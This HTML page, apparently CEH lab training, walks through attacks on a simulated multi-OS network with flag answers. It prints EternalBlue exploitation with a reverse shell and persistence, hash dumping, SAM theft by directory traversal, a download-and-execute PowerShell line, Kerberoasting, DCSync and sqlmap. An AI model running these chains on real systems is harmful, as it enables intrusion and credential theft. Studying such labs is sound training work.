<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CEH v12 Multi-OS Penetration Test</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #e0e0e0;
            font-family: 'Courier New', monospace;
            line-height: 1.6;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            padding: 40px 0;
            background: linear-gradient(45deg, #2a2a2a, #3a3a3a);
            margin: -20px -20px 40px -20px;
            border-bottom: 3px solid #555;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
        }

        h1 {
            font-size: 2.5em;
            color: #ffffff;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
            margin-bottom: 10px;
            letter-spacing: 2px;
        }

        .subtitle {
            color: #b0b0b0;
            font-size: 1.2em;
            font-style: italic;
        }

        .network-topology {
            background: linear-gradient(135deg, #1a1a2a, #2a2a3a);
            border: 2px solid #4a6a8a;
            border-radius: 10px;
            padding: 25px;
            margin: 20px 0;
            box-shadow: 0 5px 15px rgba(0,0,0,0.6);
        }

        .os-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .os-card {
            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
            border: 2px solid #444;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.6);
            transition: transform 0.3s ease;
        }

        .os-card:hover {
            transform: translateY(-5px);
        }

        .os-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }

        .os-icon {
            font-size: 2em;
            margin-right: 15px;
        }

        .windows7 { border-left: 4px solid #0078d4; }
        .windows10 { border-left: 4px solid #00bcf2; }
        .windows-server { border-left: 4px solid #ff8c00; }
        .linux { border-left: 4px solid #fcc624; }
        .android { border-left: 4px solid #a4c639; }

        h2 {
            color: #ffffff;
            font-size: 1.8em;
            margin: 30px 0 15px 0;
            padding-bottom: 10px;
            border-bottom: 2px solid #555;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
        }

        h3 {
            color: #cccccc;
            font-size: 1.3em;
            margin: 20px 0 10px 0;
            padding-left: 15px;
            border-left: 4px solid #666;
        }

        .code-block {
            background: #0d0d0d;
            border: 1px solid #333;
            border-radius: 6px;
            padding: 15px;
            margin: 15px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
        }

        .code-block code {
            color: #00ff00;
            font-size: 0.95em;
            line-height: 1.4;
        }

        .comment {
            color: #888;
            font-style: italic;
        }

        .flag-box {
            background: linear-gradient(135deg, #2a2a0a, #3a3a1a);
            border: 2px solid #666;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            box-shadow: 0 3px 8px rgba(0,0,0,0.4);
        }

        .flag-question {
            color: #ffff88;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .flag-answer {
            color: #88ff88;
            font-weight: bold;
            font-family: 'Courier New', monospace;
        }

        .attack-vector {
            background: #2a1a1a;
            border-left: 4px solid #ff6b6b;
            padding: 15px;
            margin: 15px 0;
            border-radius: 0 6px 6px 0;
        }

        .technique-list {
            background: #1a1a2a;
            border: 1px solid #333;
            border-radius: 6px;
            padding: 15px;
            margin: 10px 0;
        }

        .phase-divider {
            text-align: center;
            margin: 40px 0;
            padding: 20px 0;
            background: linear-gradient(90deg, transparent, #333, transparent);
            border-top: 1px solid #555;
            border-bottom: 1px solid #555;
        }

        .phase-number {
            color: #888;
            font-size: 2em;
            font-weight: bold;
        }

        .exploit-chain {
            background: linear-gradient(135deg, #1a0a1a, #2a1a2a);
            border: 1px solid #666;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
        }

        .step-indicator {
            display: inline-block;
            background: #444;
            color: #fff;
            padding: 4px 8px;
            border-radius: 50%;
            font-size: 0.8em;
            font-weight: bold;
            margin-right: 10px;
        }

        .vulnerability-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: #1a1a1a;
        }

        .vulnerability-table th,
        .vulnerability-table td {
            border: 1px solid #333;
            padding: 12px;
            text-align: left;
        }

        .vulnerability-table th {
            background: #2a2a2a;
            color: #fff;
            font-weight: bold;
        }

        .vuln-critical { background: rgba(255, 68, 68, 0.2); }
        .vuln-high { background: rgba(255, 136, 68, 0.2); }
        .vuln-medium { background: rgba(255, 255, 68, 0.2); }

        .os-specs {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 10px;
            font-size: 0.9em;
            margin-bottom: 15px;
        }

        .spec-label {
            color: #aaa;
            font-weight: bold;
        }

        .payload-section {
            background: #0a1a0a;
            border: 2px solid #2a4a2a;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }

        ul, ol {
            margin-left: 30px;
            margin-bottom: 15px;
        }

        li {
            margin-bottom: 8px;
            color: #d0d0d0;
        }

        strong {
            color: #ffffff;
        }

        .highlight {
            background: rgba(255, 255, 255, 0.1);
            padding: 2px 6px;
            border-radius: 3px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            h1 {
                font-size: 2em;
            }
            
            .os-grid {
                grid-template-columns: 1fr;
            }
            
            .os-specs {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>CEH v12 MULTI-OS PENETRATION TEST</h1>
            <div class="subtitle">Comprehensive Attack Strategies for Different Operating Systems</div>
        </div>

        <div class="network-topology">
            <h2>üåê Network Topology Overview</h2>
            <p><strong>Target Network:</strong> <span class="highlight">192.168.10.0/24</span></p>
            <p><strong>Scope:</strong> Mixed OS environment simulating enterprise network</p>
            <p><strong>Objective:</strong> Demonstrate OS-specific attack methodologies and lateral movement techniques</p>
        </div>

        <div class="os-grid">
            <div class="os-card windows7">
                <div class="os-header">
                    <div class="os-icon">üñ•Ô∏è</div>
                    <div>
                        <h3>Windows 7 Workstation</h3>
                        <div style="color: #0078d4;">192.168.10.11</div>
                    </div>
                </div>
                <div class="os-specs">
                    <div class="spec-label">OS Version:</div>
                    <div>Windows 7 Professional SP1</div>
                    <div class="spec-label">Services:</div>
                    <div>RDP, SMB, WinRM</div>
                    <div class="spec-label">User:</div>
                    <div>employee1 (Standard User)</div>
                </div>
            </div>

            <div class="os-card windows10">
                <div class="os-header">
                    <div class="os-icon">üíª</div>
                    <div>
                        <h3>Windows 10 Desktop</h3>
                        <div style="color: #00bcf2;">192.168.10.12</div>
                    </div>
                </div>
                <div class="os-specs">
                    <div class="spec-label">OS Version:</div>
                    <div>Windows 10 Pro 1909</div>
                    <div class="spec-label">Services:</div>
                    <div>RDP, SMB, WinRM, HTTP</div>
                    <div class="spec-label">User:</div>
                    <div>manager (Local Admin)</div>
                </div>
            </div>

            <div class="os-card windows-server">
                <div class="os-header">
                    <div class="os-icon">üè¢</div>
                    <div>
                        <h3>Windows Server 2016</h3>
                        <div style="color: #ff8c00;">192.168.10.20</div>
                    </div>
                </div>
                <div class="os-specs">
                    <div class="spec-label">OS Version:</div>
                    <div>Windows Server 2016 Standard</div>
                    <div class="spec-label">Services:</div>
                    <div>AD, DNS, DHCP, IIS, SMB</div>
                    <div class="spec-label">Role:</div>
                    <div>Domain Controller</div>
                </div>
            </div>

            <div class="os-card linux">
                <div class="os-header">
                    <div class="os-icon">üêß</div>
                    <div>
                        <h3>Ubuntu Linux Server</h3>
                        <div style="color: #fcc624;">192.168.10.30</div>
                    </div>
                </div>
                <div class="os-specs">
                    <div class="spec-label">OS Version:</div>
                    <div>Ubuntu 18.04.5 LTS</div>
                    <div class="spec-label">Services:</div>
                    <div>SSH, Apache, MySQL, FTP</div>
                    <div class="spec-label">Role:</div>
                    <div>Web/Database Server</div>
                </div>
            </div>

            <div class="os-card android">
                <div class="os-header">
                    <div class="os-icon">üì±</div>
                    <div>
                        <h3>Android Device</h3>
                        <div style="color: #a4c639;">192.168.10.40</div>
                    </div>
                </div>
                <div class="os-specs">
                    <div class="spec-label">OS Version:</div>
                    <div>Android 8.0 (API 26)</div>
                    <div class="spec-label">Services:</div>
                    <div>ADB, HTTP (Debug)</div>
                    <div class="spec-label">Device:</div>
                    <div>Corporate Tablet</div>
                </div>
            </div>
        </div>

        <div class="phase-divider">
            <div class="phase-number">DISCOVERY PHASE</div>
        </div>

        <h2>üîç Initial Network Reconnaissance</h2>

        <h3>Step 1: Comprehensive Network Scanning</h3>
        <div class="code-block">
            <code><span class="comment"># Discover all live hosts</span><br>
nmap -sn 192.168.10.0/24<br><br>
<span class="comment"># OS detection and service enumeration</span><br>
nmap -sS -sV -O -A 192.168.10.11-40<br><br>
<span class="comment"># SMB enumeration for Windows hosts</span><br>
nmap --script smb-os-discovery 192.168.10.11,12,20<br><br>
<span class="comment"># Vulnerability scanning</span><br>
nmap --script vuln 192.168.10.0/24</code>
        </div>

        <table class="vulnerability-table">
            <thead>
                <tr>
                    <th>Host</th>
                    <th>OS</th>
                    <th>Open Ports</th>
                    <th>Key Vulnerabilities</th>
                    <th>Risk Level</th>
                </tr>
            </thead>
            <tbody>
                <tr class="vuln-high">
                    <td>192.168.10.11</td>
                    <td>Windows 7 SP1</td>
                    <td>135, 139, 445, 3389</td>
                    <td>MS17-010 (EternalBlue), Weak RDP</td>
                    <td>HIGH</td>
                </tr>
                <tr class="vuln-medium">
                    <td>192.168.10.12</td>
                    <td>Windows 10 1909</td>
                    <td>80, 135, 445, 3389, 5985</td>
                    <td>IIS 10.0, WinRM enabled</td>
                    <td>MEDIUM</td>
                </tr>
                <tr class="vuln-critical">
                    <td>192.168.10.20</td>
                    <td>Windows Server 2016</td>
                    <td>53, 88, 135, 139, 389, 445, 3389</td>
                    <td>Default AD config, Kerberoasting</td>
                    <td>CRITICAL</td>
                </tr>
                <tr class="vuln-high">
                    <td>192.168.10.30</td>
                    <td>Ubuntu 18.04 LTS</td>
                    <td>21, 22, 80, 3306</td>
                    <td>Apache 2.4.29, MySQL 5.7</td>
                    <td>HIGH</td>
                </tr>
                <tr class="vuln-medium">
                    <td>192.168.10.40</td>
                    <td>Android 8.0</td>
                    <td>5555, 8080</td>
                    <td>ADB enabled, Debug interface</td>
                    <td>MEDIUM</td>
                </tr>
            </tbody>
        </table>

        <div class="flag-box">
            <div class="flag-question">FLAG 1: Which Windows machine is vulnerable to MS17-010 (EternalBlue)?</div>
            <div class="flag-answer">Answer: 192.168.10.11 (Windows 7)</div>
        </div>

        <div class="phase-divider">
            <div class="phase-number">WINDOWS 7 EXPLOITATION</div>
        </div>

        <h2>üéØ Windows 7 Professional Attack Chain</h2>

        <div class="attack-vector">
            <h3>Attack Vector: MS17-010 EternalBlue Exploitation</h3>
        </div>

        <div class="exploit-chain">
            <h3><span class="step-indicator">1</span>EternalBlue Vulnerability Check</h3>
            <div class="code-block">
                <code><span class="comment"># Verify EternalBlue vulnerability</span><br>
nmap --script smb-vuln-ms17-010 192.168.10.11<br><br>
<span class="comment"># Output shows: VULNERABLE to MS17-010</span></code>
            </div>

            <h3><span class="step-indicator">2</span>Metasploit Exploitation</h3>
            <div class="code-block">
                <code>msfconsole<br>
use exploit/windows/smb/ms17_010_eternalblue<br>
set RHOSTS 192.168.10.11<br>
set LHOST 192.168.10.5<br>
set payload windows/x64/meterpreter/reverse_tcp<br>
exploit</code>
            </div>

            <h3><span class="step-indicator">3</span>Post-Exploitation</h3>
            <div class="code-block">
                <code><span class="comment"># System information gathering</span><br>
sysinfo<br>
getuid  <span class="comment"># NT AUTHORITY\SYSTEM</span><br><br>
<span class="comment"># Dump password hashes</span><br>
hashdump<br>
<span class="comment"># employee1:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::</span><br><br>
<span class="comment"># Persistence</span><br>
run persistence -U -i 5 -p 443 -r 192.168.10.5</code>
            </div>
        </div>

        <div class="flag-box">
            <div class="flag-question">FLAG 2: What is the NTLM hash of the employee1 user?</div>
            <div class="flag-answer">Answer: 8846f7eaee8fb117ad06bdd830b7586c</div>
        </div>

        <div class="technique-list">
            <h4>Windows 7 Specific Techniques:</h4>
            <ul>
                <li><strong>UAC Bypass:</strong> exploit/windows/local/bypassuac</li>
                <li><strong>Token Impersonation:</strong> incognito module</li>
                <li><strong>Credential Harvesting:</strong> mimikatz, wdigest extraction</li>
                <li><strong>Privilege Escalation:</strong> Local exploits (MS16-032, MS15-051)</li>
            </ul>
        </div>

        <div class="phase-divider">
            <div class="phase-number">WINDOWS 10 EXPLOITATION</div>
        </div>

        <h2>üíª Windows 10 Professional Attack Chain</h2>

        <div class="attack-vector">
            <h3>Attack Vector: Web Application + WinRM Exploitation</h3>
        </div>

        <div class="exploit-chain">
            <h3><span class="step-indicator">1</span>Web Application Reconnaissance</h3>
            <div class="code-block">
                <code><span class="comment"># IIS web server enumeration</span><br>
dirb http://192.168.10.12<br>
nikto -h http://192.168.10.12<br><br>
<span class="comment"># Discovered: /admin/login.asp</span><br>
<span class="comment"># Found: Directory traversal in file parameter</span></code>
            </div>

            <h3><span class="step-indicator">2</span>Directory Traversal Attack</h3>
            <div class="code-block">
                <code><span class="comment"># Extract SAM file via directory traversal</span><br>
curl "http://192.168.10.12/admin/view.asp?file=../../../windows/system32/config/sam"<br><br>
<span class="comment"># Extract SYSTEM file</span><br>
curl "http://192.168.10.12/admin/view.asp?file=../../../windows/system32/config/system"<br><br>
<span class="comment"># Crack passwords with samdump2</span><br>
samdump2 system sam<br>
<span class="comment"># Result: manager:Password123!</span></code>
            </div>

            <h3><span class="step-indicator">3</span>WinRM Authentication</h3>
            <div class="code-block">
                <code><span class="comment"># Connect via WinRM with cracked credentials</span><br>
evil-winrm -i 192.168.10.12 -u manager -p 'Password123!'<br><br>
<span class="comment"># Alternative: Metasploit WinRM login</span><br>
use auxiliary/scanner/winrm/winrm_login<br>
set RHOSTS 192.168.10.12<br>
set USERNAME manager<br>
set PASSWORD Password123!<br>
run</code>
            </div>

            <h3><span class="step-indicator">4</span>PowerShell Post-Exploitation</h3>
            <div class="code-block">
                <code><span class="comment"># System enumeration</span><br>
Get-ComputerInfo<br>
whoami /priv<br><br>
<span class="comment"># Download and execute PowerSploit</span><br>
IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.5/PowerUp.ps1')<br>
Invoke-AllChecks<br><br>
<span class="comment"># Find unquoted service paths</span><br>
Get-WmiObject -Class win32_service | Where-Object {$_.pathname -match '^[^"].*[^"]$'}</code>
            </div>
        </div>

        <div class="flag-box">
            <div class="flag-question">FLAG 3: What is the password for the manager account on Windows 10?</div>
            <div class="flag-answer">Answer: Password123!</div>
        </div>

        <div class="technique-list">
            <h4>Windows 10 Specific Techniques:</h4>
            <ul>
                <li><strong>AMSI Bypass:</strong> PowerShell obfuscation techniques</li>
                <li><strong>Windows Defender Evasion:</strong> Process hollowing, reflective DLL injection</li>
                <li><strong>Credential Guard Bypass:</strong> LSASS memory dumping alternatives</li>
                <li><strong>UAC Bypass:</strong> fodhelper, computerdefaults techniques</li>
            </ul>
        </div>

        <div class="phase-divider">
            <div class="phase-number">WINDOWS SERVER 2016</div>
        </div>

        <h2>üè¢ Windows Server 2016 Domain Controller</h2>

        <div class="attack-vector">
            <h3>Attack Vector: Active Directory Exploitation</h3>
        </div>

        <div class="exploit-chain">
            <h3><span class="step-indicator">1</span>Domain Enumeration</h3>
            <div class="code-block">
                <code><span class="comment"># SMB null session enumeration</span><br>
enum4linux 192.168.10.20<br>
smbclient -L //192.168.10.20 -N<br><br>
<span class="comment"># LDAP enumeration</span><br>
ldapsearch -x -h 192.168.10.20 -s base namingcontexts<br><br>
<span class="comment"># Domain: TECHCORP.LOCAL</span><br>
<span class="comment"># Users found: administrator, krbtgt, service_account</span></code>
            </div>

            <h3><span class="step-indicator">2</span>ASREPRoasting Attack</h3>
            <div class="code-block">
                <code><span class="comment"># Check for users with "Do not require Kerberos preauthentication"</span><br>
python3 GetNPUsers.py TECHCORP.LOCAL/ -dc-ip 192.168.10.20 -request<br><br>
<span class="comment"># Found vulnerable user: service_account</span><br>
<span class="comment"># Hash: $krb5asrep$service_account@TECHCORP.LOCAL:...</span><br><br>
<span class="comment"># Crack the hash</span><br>
hashcat -m 18200 asrep_hash.txt rockyou.txt<br>
<span class="comment"># Result: service_account:Service123!</span></code>
            </div>

            <h3><span class="step-indicator">3</span>Kerberoasting Attack</h3>
            <div class="code-block">
                <code><span class="comment"># Request service tickets</span><br>
python3 GetUserSPNs.py TECHCORP.LOCAL/service_account:Service123! -dc-ip 192.168.10.20 -request<br><br>
<span class="comment"># Extract SPN hashes</span><br>
<span class="comment"># Found SPN: HTTP/web.techcorp.local</span><br><br>
<span class="comment"># Crack service account hash</span><br>
hashcat -m 13100 kerberoast_hash.txt rockyou.txt</code>
            </div>

            <h3><span class="step-indicator">4</span>DCSync Attack</h3>
            <div class="code-block">
                <code><span class="comment"># Assume we got domain admin via credential stuffing</span><br>
python3 secretsdump.py TECHCORP.LOCAL/administrator:Admin2021!@192.168.10.20<br><br>
<span class="comment"># Extract all domain hashes including:</span><br>
<span class="comment"># krbtgt:502:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span></code>
            </div>
        </div>

        <div class="flag-box">
            <div class="flag-question">FLAG 4: What is the NTLM hash of the krbtgt account?</div>
            <div class="flag-answer">Answer: 32ed87bdb5fdc5e9cba88547376818d4</div>
        </div>

        <div class="technique-list">
            <h4>Windows Server/AD Specific Techniques:</h4>
            <ul>
                <li><strong>Golden Ticket:</strong> Create persistent domain admin access</li>
                <li><strong>Silver Ticket:</strong> Service-specific ticket forgery</li>
                <li><strong>DCSync:</strong> Replicate directory data without domain admin</li>
                <li><strong>NTDS.dit Extraction:</strong> Offline hash extraction</li>
            </ul>
        </div>

        <div class="phase-divider">
            <div class="phase-number">LINUX EXPLOITATION</div>
        </div>

        <h2>üêß Ubuntu Linux Server Attack Chain</h2>

        <div class="attack-vector">
            <h3>Attack Vector: Web Application + Privilege Escalation</h3>
        </div>

        <div class="exploit-chain">
            <h3><span class="step-indicator">1</span>Web Application Testing</h3>
            <div class="code-block">
                <code><span class="comment"># Apache version detection</span><br>
nmap -sV -p 80 192.168.10.30<br>
<span class="comment"># Apache/2.4.29 (Ubuntu)</span><br><br>
<span class="comment"># Directory brute forcing</span><br>
gobuster dir -u http://192.168.10.30 -w /usr/share/wordlists/dirb/common.txt<br><br>
<span class="comment"># Found directories:</span><br>
<span class="comment"># /admin (403)</span><br>
<span class="comment"># /backup (200)</span><br>
<span class="comment"># /uploads (200)</span></code>
            </div>

            <h3><span class="step-indicator">2</span>SQL Injection Exploitation</h3>
            <div class="code-block">
                <code><span class="comment"># Found login form at /admin/login.php</span><br>
sqlmap -u "http://192.168.10.30/admin/login.php" --data="user=admin&pass=test" --dbs<br><br>
<span class="comment"